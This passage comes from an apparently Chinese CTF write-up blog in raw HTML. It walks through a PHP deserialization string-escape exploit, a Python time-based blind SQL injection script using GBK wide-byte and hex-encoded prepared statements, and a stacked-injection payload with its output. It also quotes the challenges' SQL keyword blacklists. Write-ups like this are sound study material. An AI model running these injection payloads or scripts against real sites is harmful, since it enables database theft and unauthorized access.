class=\"keyword\">function</span> <span class=\"title\">__toString</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">$this</span>-&gt;nickname-&gt;update(<span class=\"keyword\">$this</span>-&gt;age);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">\"0-0\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>有update方法的只有dbCtrl类，但是Info类中有一个魔法调用</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span><span class=\"params\">($name,$argument)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>如果让User类中的$this-&gt;nickname为dbCtrl类的实例就调用到dbCtrl::login方法，而且$sql可控</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">login</span><span class=\"params\">($sql)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;mysqli=<span class=\"keyword\">new</span> mysqli(<span class=\"keyword\">$this</span>-&gt;hostname, <span class=\"keyword\">$this</span>-&gt;dbuser, <span class=\"keyword\">$this</span>-&gt;dbpass, <span class=\"keyword\">$this</span>-&gt;database);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">\"连接失败，错误:\"</span> . <span class=\"keyword\">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $result=<span class=\"keyword\">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class=\"line\">        $result-&gt;bind_param(<span class=\"string\">'s'</span>, <span class=\"keyword\">$this</span>-&gt;name);</span><br><span class=\"line\">        $result-&gt;execute();</span><br><span class=\"line\">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class=\"line\">        $result-&gt;fetch();</span><br><span class=\"line\">        $result-&gt;close();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;token==<span class=\"string\">'admin'</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> $idResult;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!$idResult) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span>(<span class=\"string\">'用户不存在!'</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (md5(<span class=\"keyword\">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span>(<span class=\"string\">'密码错误！'</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $_SESSION[<span class=\"string\">'token'</span>]=<span class=\"keyword\">$this</span>-&gt;name;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $idResult;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>附上脚本</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Info</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $age;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $nickname;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $CtrlCase;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">User</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $id;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $age;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $nickname;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;age=<span class=\"string\">'select password,id from user where username=?'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;nickname=<span class=\"keyword\">new</span> Info();</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;nickname-&gt;CtrlCase=<span class=\"keyword\">new</span> dbCtrl();</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;nickname-&gt;nickname=<span class=\"string\">''</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">dbCtrl</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $hostname=<span class=\"string\">\"127.0.0.1\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $dbuser=<span class=\"string\">\"root\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $dbpass=<span class=\"string\">\"root\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $database=<span class=\"string\">\"test\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $name=<span class=\"string\">'admin'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $password=<span class=\"string\">'1'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $mysqli;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $token=<span class=\"string\">'admin'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">Class</span> <span class=\"title\">UpdateHelper</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $id;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $newinfo;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $sql;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;sql=<span class=\"keyword\">new</span> User();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$test=<span class=\"keyword\">new</span> UpdateHelper();</span><br><span class=\"line\">$a=<span class=\"keyword\">new</span> Info();</span><br><span class=\"line\">$a-&gt;nickname=<span class=\"string\">''</span>;</span><br><span class=\"line\">$a-&gt;CtrlCase=$test;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> urldecode(<span class=\"string\">'%09'</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize($a);</span><br><span class=\"line\"><span class=\"comment\">//O:4:\"Info\":3:&#123;s:3:\"age\";N;s:8:\"nickname\";s:0:\"</span></span><br><span class=\"line\"><span class=\"string\">\";s:8:\"</span>CtrlCase<span class=\"string\">\";O:12:\"</span>UpdateHelper<span class=\"string\">\":3:&#123;s:2:\"</span>id<span class=\"string\">\";N;s:7:\"</span>newinfo<span class=\"string\">\";N;s:3:\"</span>sql<span class=\"string\">\";O:4:\"</span>User<span class=\"string\">\":3:&#123;s:2:\"</span>id<span class=\"string\">\";N;s:3:\"</span>age<span class=\"string\">\";s:45:\"</span>select password,id from user where username=?<span class=\"string\">\";s:8:\"</span>nickname<span class=\"string\">\";O:4:\"</span>Info<span class=\"string\">\":3:&#123;s:3:\"</span>age<span class=\"string\">\";N;s:8:\"</span>nickname<span class=\"string\">\";s:0:\"</span><span class=\"string\">\";s:8:\"</span>CtrlCase<span class=\"string\">\";O:6:\"</span>dbCtrl<span class=\"string\">\":8:&#123;s:8:\"</span>hostname<span class=\"string\">\";s:9:\"</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"string\">\";s:6:\"</span>dbuser<span class=\"string\">\";s:4:\"</span>root<span class=\"string\">\";s:6:\"</span>dbpass<span class=\"string\">\";s:4:\"</span>root<span class=\"string\">\";s:8:\"</span>database<span class=\"string\">\";s:4:\"</span>test<span class=\"string\">\";s:4:\"</span>name<span class=\"string\">\";s:5:\"</span>admin<span class=\"string\">\";s:8:\"</span>password<span class=\"string\">\";s:1:\"</span><span class=\"number\">1</span><span class=\"string\">\";s:6:\"</span>mysqli<span class=\"string\">\";N;s:5:\"</span>token<span class=\"string\">\";s:5:\"</span>admin<span class=\"string\">\";&#125;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>使用相应长度的字符逃逸</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">age=&amp;nickname=******************************************************************************************flagflag\";s:8:\"CtrlCase\";O:12:\"UpdateHelper\":3:&#123;s:2:\"id\";N;s:7:\"newinfo\";N;s:3:\"sql\";O:4:\"User\":3:&#123;s:2:\"id\";N;s:3:\"age\";s:45:\"select password,id from user where username=?\";s:8:\"nickname\";O:4:\"Info\":3:&#123;s:3:\"age\";N;s:8:\"nickname\";s:0:\"\";s:8:\"CtrlCase\";O:6:\"dbCtrl\":8:&#123;s:8:\"hostname\";s:9:\"127.0.0.1\";s:6:\"dbuser\";s:4:\"root\";s:6:\"dbpass\";s:4:\"root\";s:8:\"database\";s:4:\"test\";s:4:\"name\";s:5:\"admin\";s:8:\"password\";s:1:\"1\";s:6:\"mysqli\";N;s:5:\"token\";s:5:\"admin\";&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>得到MD5，解密，登录即可拿到flag</p>\n<h1 id=\"easysqli-copy\"><a href=\"#easysqli-copy\" class=\"headerlink\" title=\"easysqli_copy\"></a>easysqli_copy</h1><p>打开题目就是源码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php </span><br><span class=\"line\">    function check($str)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\\^|&amp;|database/i'</span>,$str,$matches))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            print_r($matches);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">try</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $db = new PDO(<span class=\"string\">'mysql:host=localhost;dbname=pdotest'</span>,<span class=\"string\">'root'</span>,<span class=\"string\">'******'</span>);</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    catch(Exception $e)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        echo $e-&gt;getMessage();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(isset($_GET[<span class=\"string\">'id'</span>]))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $id = $_GET[<span class=\"string\">'id'</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $test = $db-&gt;query(\"select balabala from table1\");</span><br><span class=\"line\">        $res = $test-&gt;fetch(PDO::FETCH_ASSOC);</span><br><span class=\"line\">        $id = $res[<span class=\"string\">'balabala'</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(check($id))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $query = <span class=\"string\">\"select balabala from table1 where 1=?\"</span>;</span><br><span class=\"line\">        $db-&gt;query(\"set names gbk\");</span><br><span class=\"line\">        $row = $db-&gt;prepare($query);</span><br><span class=\"line\">        $row-&gt;bindParam(1,$id);</span><br><span class=\"line\">        $row-&gt;execute();</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>没有能在题目结束之前解出来，后面看到一篇<a href=\"http://www.52bug.cn/hkjs/6152.html\" target=\"_blank\" rel=\"noopener\">文章</a>，之前也看到一篇文章，不过只有上半部分。使用预编译加上16禁止就可以绕过</p>\n<p>编写盲注脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span><span class=\"params\">(payload)</span>:</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://localhost/1.php?id=1%df%27;set%20@x='</span>+payload+<span class=\"string\">';prepare%20a%20from%20@x;EXECUTE%20a;'</span></span><br><span class=\"line\">    html = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># print(url)</span></span><br><span class=\"line\">    <span class=\"comment\"># print(html)</span></span><br><span class=\"line\">    <span class=\"comment\"># return html</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">str2hex</span><span class=\"params\">(strs)</span>:</span></span><br><span class=\"line\">    he=<span class=\"string\">'0x'</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> strs:</span><br><span class=\"line\">        he+=hex(ord(x))[<span class=\"number\">2</span>:]</span><br><span class=\"line\">    <span class=\"comment\"># print(he)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> he</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binsea</span><span class=\"params\">(s_payload,len=<span class=\"number\">999</span>)</span>:</span></span><br><span class=\"line\">    result = <span class=\"string\">''</span></span><br><span class=\"line\">    x=<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> x &lt;= len :</span><br><span class=\"line\">        error = <span class=\"number\">0</span></span><br><span class=\"line\">        left = <span class=\"number\">0</span></span><br><span class=\"line\">        right = <span class=\"number\">126</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> left &lt;= right:</span><br><span class=\"line\">            mid = (left + right) / <span class=\"number\">2</span></span><br><span class=\"line\">            payload = <span class=\"string\">\"select if(ascii(substr((%s),%d,1))&gt;%d,sleep(1),1)\"</span> % (s_payload,x, mid)</span><br><span class=\"line\">            payload=str2hex(payload)</span><br><span class=\"line\">            t1=time.time()</span><br><span class=\"line\">            res = get(payload)</span><br><span class=\"line\">            <span class=\"comment\"># if res.status_code == 404 or res.status_code == 429:</span></span><br><span class=\"line\">            <span class=\"comment\">#     x=x-1</span></span><br><span class=\"line\">            <span class=\"comment\">#     error = 1</span></span><br><span class=\"line\">            <span class=\"comment\">#     break</span></span><br><span class=\"line\">            <span class=\"comment\"># html=res.text</span></span><br><span class=\"line\">            <span class=\"comment\"># print('*-*-*-*-*-*', mid)</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> time.time()-t1&gt;=<span class=\"number\">1</span>:</span><br><span class=\"line\">                left = mid +<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                right = mid <span class=\"number\">-1</span></span><br><span class=\"line\">        mid = int((left + right + <span class=\"number\">1</span>) / <span class=\"number\">2</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">0</span> :</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> error == <span class=\"number\">0</span> :</span><br><span class=\"line\">            result += chr(mid)</span><br><span class=\"line\">            print(result)</span><br><span class=\"line\">        x=x+<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_database</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    s_payload=<span class=\"string\">'database()'</span></span><br><span class=\"line\">    database = binsea(s_payload)</span><br><span class=\"line\">    print(database)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_tabls</span><span class=\"params\">(db)</span>:</span></span><br><span class=\"line\">    s_payload = <span class=\"string\">'select(group_concat(table_name))from(information_schema.tables)where(table_schema=\\''</span>+db+<span class=\"string\">'\\')'</span></span><br><span class=\"line\">    tables=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_columns</span><span class=\"params\">(table)</span>:</span></span><br><span class=\"line\">    s_payload = <span class=\"string\">'select(group_concat(column_name))from(information_schema.columns)where(table_name=\\''</span>+table+<span class=\"string\">'\\')'</span></span><br><span class=\"line\">    columns=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data</span><span class=\"params\">(columns,table)</span>:</span></span><br><span class=\"line\">    s_payload=<span class=\"string\">'select group_concat('</span>+columns+<span class=\"string\">') from '</span>+table</span><br><span class=\"line\">    password=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">get_data(<span class=\"string\">'flag'</span>,<span class=\"string\">'table1'</span>)</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h1 id=\"blacklist\"><a href=\"#blacklist\" class=\"headerlink\" title=\"blacklist\"></a>blacklist</h1><p>打开题目是一个提交框，是强网杯 2019随便注改过来的，但是禁止了set，prepare，alter，rename。改表，预处理是不行了。</p>\n<p>测试时发现</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">preg_match(<span class=\"string\">\"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i\"</span>,$inject);</span><br></pre></td></tr></table></figure>\n\n<p>存在堆叠注入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;?inject&#x3D;1%27||id;show tables;desc words;desc FlagHere;</span><br></pre></td></tr></table></figure>\n\n<p>返回结果如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">array(2) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(1) &quot;1&quot;</span><br><span class=\"line\">  [1]&#x3D;&gt;</span><br><span class=\"line\">  string(7) &quot;hahahah&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">array(2) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(1) &quot;2&quot;</span><br><span class=\"line\">  [1]&#x3D;&gt;</span><br><span class=\"line\">  string(12) &quot;miaomiaomiao&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">array(2) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(6) &quot;114514&quot;</span><br><span class=\"line\">  [1]&#x3D;&gt;</span><br><span class=\"line\">  string(2) &quot;ys&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">array(1) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(8) &quot;FlagHere&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">array(1) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(5) &quot;words&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">array(6) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(2) &quot;id&quot;</span><br><span class=\"line\">  [1]&#x3D;&gt;</span><br><span class=\"line\">  string(7) &quot;int(10)&quot;</span><br><span class=\"line\">  [2]&#x3D;&gt;</span><br><span class=\"line\">  string(2) &quot;NO&quot;</span><br><span class=\"line\">  [3]&#x3D;&gt;</span><br><span class=\"line\">  string(0) &quot;&quot;</span><br><span class=\"line\">  [4]&#x3D;&gt;</span><br><span class=\"line\">  NULL</span><br><span class=\"line\">  [5]&#x3D;&gt;</span><br><span class=\"line\">  string(0) &quot;&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">array(6) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(4) &quot;data&quot;</span><br><span class=\"line\">  [1]&#x3D;&gt;</span><br><span class=\"line\">  string(11) &quot;varchar(20)&quot;</span><br><span class=\"line\">  [2]&#x3D;&gt;</span><br><span class=\"line\">  string(2) &quot;NO&quot;</span><br><span class=\"line\">  